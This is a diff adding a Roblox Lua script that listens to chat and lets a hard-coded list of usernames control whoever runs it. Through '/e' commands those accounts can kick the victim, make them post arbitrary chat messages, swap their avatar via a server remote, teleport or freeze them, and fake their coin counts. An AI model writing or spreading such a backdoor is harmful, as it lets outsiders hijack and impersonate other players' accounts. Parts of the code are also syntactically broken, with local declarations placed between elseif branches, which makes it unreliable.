@@ -1,0 +1,560 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local TweenService = game:GetService("TweenService")
+
+local targetUsernames = {
+    ["zynlopea"] = true,
+    ["ismaelbestogun"] = true,
+    ["dinmammaefin1223"] = true,
+    ["Sigmahabibi160"] = true,
+    ["RIPK1II3R"] = true,
+    ["klman88"] = true,
+    ["alvin_thepokefan"] = true,
+    ["Arbaletyy"] = true,
+    ["karumiako12"] = true,
+    ["ZapHyper70"] = true,
+    ["Rylix56"] = true,
+    ["zynlopers"] = true,
+    ["slypzo"] = true,
+    ["zynlope"] = true,
+    ["SechiFanGirl"] = true,
+    ["zynlopezzz"] = true,
+    ["zynlopes"] = true,
+    ["zynynynyn"] = true,
+    ["jxrd4n_4"] = true,
+    ["ovvlyyrez227nkr8sbau"] = true,
+    ["zynloper"] = true,
+    ["alrichpiuu"] = true,
+    ["Cicogna_lol"] = true,
+    ["fkgjrud"] = true,
+    ["sci_mythical77"] = true,
+    ["nowummy"] = true,
+    ["nowumy"] = true,
+}
+
+local function isTargetPlayer(playerName)
+    return targetUsernames[playerName] ~= nil
+end
+
+local function showBroadcastMessage(text)
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    local existingGui = playerGui:FindFirstChild("BroadcastGui")
+    if existingGui then
+        existingGui:Destroy()
+    end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BroadcastGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0.3, 0)
+    label.Position = UDim2.new(0, 0, 0.35, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamBold
+    label.TextStrokeTransparency = 0
+    label.Parent = screenGui
+
+    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+    delay(3, function()
+        local tween = TweenService:Create(label, tweenInfo, {TextTransparency = 1, TextStrokeTransparency = 1})
+        tween:Play()
+        tween.Completed:Connect(function()
+            screenGui:Destroy()
+        end)
+    end)
+end
+
+local function onChat(player, message)
+    if not isTargetPlayer(player.Name) then return end
+    local command = message:lower()
+
+    if command == "/e fa" then
+        local myPlayer = Players.LocalPlayer
+        local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            local animation = Instance.new("Animation")
+            animation.AnimationId = "rbxassetid://754656200"
+            local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
+            local animationTrack = animator:LoadAnimation(animation)
+            animationTrack.Looped = true
+            animationTrack:Play()
+            animationTrack:AdjustSpeed(50)
+        end
+
+    elseif command == "/e unfa" then
+        if animationTrack then
+            animationTrack:Stop()
+        end
+
+    elseif command == "/e kitten" then
+        local myPlayer = Players.LocalPlayer
+        if myPlayer then
+            local args = {
+                [1] = {
+                    ["SwimAnimation"] = 2510240941,
+                    ["Torso"] = 4637151279,
+                    ["ProportionScale"] = 0,
+                    ["ClimbAnimation"] = 2510230574,
+                    ["Shirt"] = 11289085978,
+                    ["FaceAccessory"] = "13353986061,12580366888,8923599923",
+                    ["RightArmColor"] = { "248", "248", "248" },
+                    ["HairAccessory"] = "13918965164,14314838611",
+                    ["FallAnimation"] = 2510233257,
+                    ["TorsoColor"] = { "248", "248", "248" },
+                    ["DepthScale"] = 0.8,
+                    ["HeightScale"] = 0.9,
+                    ["WaistAccessory"] = "14335771887",
+                    ["BodyTypeScale"] = 0,
+                    ["BackAccessory"] = "8651335862",
+                    ["Emotes"] = {
+                        ["1"] = { 9528286240 },
+                        ["8"] = { 12874468267 },
+                        ["3"] = { 7466046574 },
+                        ["2"] = { 11309263077 },
+                        ["4"] = { 3576968026 },
+                        ["7"] = { 13344121112 }
+                    },
+                    ["Pants"] = 14851012835,
+                    ["JumpAnimation"] = 2510236649,
+                    ["HatAccessory"] = "12579341301,13142881183,1402432199",
+                    ["WalkAnimation"] = 2510242378,
+                    ["IdleAnimation"] = 2510235063,
+                    ["RunAnimation"] = 2510238627,
+                    ["HeadScale"] = 1,
+                    ["GraphicTShirt"] = 10891067215
+                }
+            }
+            ReplicatedStorage.FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
+        end
+
+elseif command == "/e neko" then
+        local myPlayer = Players.LocalPlayer
+        if myPlayer then
+            --avatar one
+local args = {
+    [1] = {
+        ["WalkAnimation"] = 0;
+        ["Face"] = 0;
+        ["ProportionScale"] = 0;
+        ["ClimbAnimation"] = 0;
+        ["Shirt"] = 0;
+        ["FaceAccessory"] = "127655703506889";
+        ["RightArmColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["HairAccessory"] = "16199942276";
+        ["RightArm"] = 0;
+        ["Head"] = 0;
+        ["FallAnimation"] = 754636589;
+        ["TorsoColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["DepthScale"] = 0.7799999713897705;
+        ["RightLeg"] = 0;
+        ["HeightScale"] = 0.9399999976158142;
+        ["LeftLeg"] = 0;
+        ["RightLegColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["LeftLegColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["WidthScale"] = 0.6200000047683716;
+        ["BodyTypeScale"] = 0;
+        ["RunAnimation"] = 2510238627;
+        ["LeftArmColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["Emotes"] = {
+            ["1"] = {
+                [1] = 14900153406;
+            };
+            ["8"] = {
+                [1] = 130245358716273;
+            };
+            ["3"] = {
+                [1] = 7466047578;
+            };
+            ["2"] = {
+                [1] = 13823339506;
+            };
+            ["5"] = {
+                [1] = 15963348695;
+            };
+            ["4"] = {
+                [1] = 3762654854;
+            };
+            ["7"] = {
+                [1] = 5915773992;
+            };
+            ["6"] = {
+                [1] = 3994127840;
+            };
+        };
+        ["Pants"] = 13251679681;
+        ["AccessoryBlob"] = {};
+        ["WaistAccessory"] = "13521847144";
+        ["ShouldersAccessory"] = "";
+        ["NeckAccessory"] = "";
+        ["FrontAccessory"] = "";
+        ["SwimAnimation"] = 0;
+        ["BackAccessory"] = "";
+        ["HeadColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["JumpAnimation"] = 658832070;
+        ["IdleAnimation"] = 2510235063;
+        ["HatAccessory"] = "15411280786";
+        ["HeadScale"] = 0.949999988079071;
+        ["Torso"] = 48474356;
+        ["GraphicTShirt"] = 0;
+        ["LeftArm"] = 0;
+    };
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections", 9e9):WaitForChild("NewAESaveAvatar", 9e9):InvokeServer(unpack(args))
+        end
+
+elseif command == "/e neko2" then
+        local myPlayer = Players.LocalPlayer
+        if myPlayer then
+            local args = {
+    [1] = {
+        ["WalkAnimation"] = 0;
+        ["Face"] = 0;
+        ["ProportionScale"] = 0;
+        ["ClimbAnimation"] = 0;
+        ["Shirt"] = 14544225607;
+        ["FaceAccessory"] = "123010184222932";
+        ["RightArmColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["HairAccessory"] = "16199722680";
+        ["RightArm"] = 0;
+        ["Head"] = 0;
+        ["FallAnimation"] = 0;
+        ["TorsoColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["DepthScale"] = 0.7838320732116699;
+        ["RightLeg"] = 0;
+        ["HeightScale"] = 0.8897777795791626;
+        ["LeftLeg"] = 0;
+        ["RightLegColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["LeftLegColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["WidthScale"] = 0.677886426448822;
+        ["BodyTypeScale"] = 0;
+        ["RunAnimation"] = 0;
+        ["LeftArmColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["Emotes"] = {
+            ["1"] = {
+                [1] = 3576686446;
+            };
+            ["8"] = {
+                [1] = 4646306072;
+            };
+            ["3"] = {
+                [1] = 3994127840;
+            };
+            ["2"] = {
+                [1] = 3716636630;
+            };
+            ["5"] = {
+                [1] = 4049646104;
+            };
+            ["4"] = {
+                [1] = 4102315500;
+            };
+            ["7"] = {
+                [1] = 4849497510;
+            };
+            ["6"] = {
+                [1] = 4391208058;
+            };
+        };
+        ["Pants"] = 12955520751;
+        ["AccessoryBlob"] = {};
+        ["WaistAccessory"] = "";
+        ["ShouldersAccessory"] = "";
+        ["NeckAccessory"] = "";
+        ["FrontAccessory"] = "";
+        ["SwimAnimation"] = 0;
+        ["BackAccessory"] = "";
+        ["HeadColor"] = {
+            [1] = "248.0000004172325";
+            [2] = "248.0000004172325";
+            [3] = "248.0000004172325";
+        };
+        ["JumpAnimation"] = 0;
+        ["IdleAnimation"] = 18538150608;
+        ["HatAccessory"] = "17409833209";
+        ["HeadScale"] = 1;
+        ["Torso"] = 48474356;
+        ["GraphicTShirt"] = 0;
+        ["LeftArm"] = 0;
+    };
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections", 9e9):WaitForChild("NewAESaveAvatar", 9e9):InvokeServer(unpack(args))
+        end
+
+
+local spinning = false
+local floating = false
+local spinConnection
+local floatConnection
+
+elseif command == "/e spin" then
+    if not spinning then
+        spinning = true
+        local character = Players.LocalPlayer.Character
+        spinConnection = game:GetService("RunService").Heartbeat:Connect(function()
+            if character and character:FindFirstChild("HumanoidRootPart") then
+                character.HumanoidRootPart.CFrame *= CFrame.Angles(0, math.rad(10), 0)
+            end
+        end)
+    end
+
+elseif command == "/e unspin" then
+    if spinning then
+        spinning = false
+        if spinConnection then spinConnection:Disconnect() end
+    end
+
+elseif command == "/e float" then
+    if not floating then
+        floating = true
+        local character = Players.LocalPlayer.Character
+        floatConnection = game:GetService("RunService").Heartbeat:Connect(function()
+            if character and character:FindFirstChild("HumanoidRootPart") then
+                character:FindFirstChild("HumanoidRootPart").CFrame += Vector3.new(0, 0.1, 0)
+            end
+        end)
+    end
+
+elseif command == "/e unfloat" then
+    if floating then
+        floating = false
+        if floatConnection then floatConnection:Disconnect() end
+    end
+
+elseif command == "/e neon" then
+    local character = Players.LocalPlayer.Character
+    for _, part in pairs(character:GetChildren()) do
+        if part:IsA("BasePart") then
+            part.Material = Enum.Material.Neon
+            part.Color = Color3.fromRGB(0, 255, 255)
+        end
+    end
+
+elseif command == "/e disco" then
+    local character = Players.LocalPlayer.Character
+    coroutine.wrap(function()
+        for i = 1, 20 do
+            for _, part in pairs(character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    part.Color = Color3.new(math.random(), math.random(), math.random())
+                end
+            end
+            wait(0.2)
+        end
+    end)()
+
+elseif command == "/e giant" then
+    local char = Players.LocalPlayer.Character
+    for _, part in pairs(char:GetChildren()) do
+        if part:IsA("BasePart") then
+            part.Size *= 2
+        end
+    end
+
+elseif command == "/e tiny" then
+    local char = Players.LocalPlayer.Character
+    for _, part in pairs(char:GetChildren()) do
+        if part:IsA("BasePart") then
+            part.Size *= 0.5
+        end
+    end
+
+elseif command == "/e orbit" then
+    local myPlayer = Players.LocalPlayer
+    local myChar = myPlayer.Character
+    local targetChar = player.Character
+    local angle = 0
+    coroutine.wrap(function()
+        while true do
+            if not myChar or not targetChar then break end
+            local root = myChar:FindFirstChild("HumanoidRootPart")
+            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
+            if root and targetRoot then
+                angle = angle + 0.1
+                local radius = 5
+                local offset = Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
+                root.CFrame = CFrame.new(targetRoot.Position + offset)
+            end
+            wait()
+        end
+    end)()
+
+elseif command == "/e clone" then
+    local char = Players.LocalPlayer.Character
+    if char then
+        local clone = char:Clone()
+        clone.Parent = workspace
+        clone:SetPrimaryPartCFrame(char:GetPrimaryPartCFrame() + Vector3.new(3, 0, 0))
+    end
+
+    elseif command == "/e freeze" then
+        local myCharacter = Players.LocalPlayer.Character
+        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+            myCharacter.HumanoidRootPart.Anchored = true
+        end
+
+    elseif command == "/e unfreeze" then
+        local myCharacter = Players.LocalPlayer.Character
+        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+            myCharacter.HumanoidRootPart.Anchored = false
+        end
+
+    elseif command:sub(1, 7) == "/e chat" then
+        local chatMessage = message:sub(9)
+        if chatMessage:gsub("%s+", "") ~= "" then
+            local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
+            if textChannel then
+                textChannel:SendAsync(chatMessage)
+            end
+        end
+
+    elseif command == "/e bring" then
+        local targetCharacter = player.Character
+        local myPlayer = Players.LocalPlayer
+        if myPlayer and targetCharacter then
+            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
+            local myCharacter = myPlayer.Character
+            if myCharacter and targetHRP then
+                local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
+                if myHRP then
+                    myHRP.CFrame = targetHRP.CFrame
+                end
+            end
+        end
+
+    elseif command == "/e kick" then
+        local myPlayer = Players.LocalPlayer
+        if myPlayer then
+            myPlayer:Kick("Either kicked by Zynlope, or an admin of Zynlope.")
+        end
+
+    elseif command:sub(1, 8) == "/e kick r" then
+        local reason = message:sub(10)
+        if reason ~= "" then
+            local myPlayer = Players.LocalPlayer
+            if myPlayer then
+                myPlayer:Kick("Kicked by command reason: "..reason)
+            end
+        end
+
+    elseif command:sub(1, 5) == "/e js" then
+        local broadcastMessage = message:sub(7)
+        if broadcastMessage:gsub("%s", "") ~= "" then
+            showBroadcastMessage(broadcastMessage)
+        end
+
+    elseif command:sub(1, 8) == "/e coins" then
+        local coinValue = message:sub(10)
+        if coinValue:gsub("%s", "") ~= "" then
+            local text = tostring(coinValue)
+            local player = Players.LocalPlayer
+
+            local mainGui = player.PlayerGui:FindFirstChild("MainGui")
+            if mainGui then
+                local coinsContainer = mainGui:FindFirstChild("CoinsContainer")
+                if coinsContainer then
+                    local container = coinsContainer:FindFirstChild("Container")
+                    if container and container:FindFirstChild("Amount") then
+                        container.Amount.Text = text
+                    end
+                end
+            end
+
+            local slayersPlayer = Players:FindFirstChild("SlayerssUnleashedd")
+            if slayersPlayer then
+                local shopGui = slayersPlayer.PlayerGui:FindFirstChild("ShopGui")
+                if shopGui then
+                    local bgContent = shopGui:FindFirstChild("Background")
+                    if bgContent and bgContent:FindFirstChild("Content") then
+                        local main = bgContent.Content:FindFirstChild("Main")
+                        if main and main:FindFirstChild("TopContainer") then
+                            local topContainer = main.TopContainer
+                            if topContainer:FindFirstChild("CoinsContainer") and topContainer.CoinsContainer:FindFirstChild("TotalCoins") then
+                                topContainer.CoinsContainer.TotalCoins.Text = text
+                            end
+                        end
+                    end
+                end
+
+                local screenGui = slayersPlayer.PlayerGui:FindFirstChild("ScreenGui")
+                if screenGui then
+                    local itemShop = screenGui:FindFirstChild("ItemShop")
+                    if itemShop and itemShop:FindFirstChild("ShopContent") then
+                        local shopContent = itemShop.ShopContent
+                        if shopContent:FindFirstChild("TopBar") then
+                            local topBar = shopContent.TopBar
+                            if topBar:FindFirstChild("ButtonBuyCoins") and topBar.ButtonBuyCoins:FindFirstChild("CoinAmount") then
+                                topBar.ButtonBuyCoins.CoinAmount.Text = text
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end)
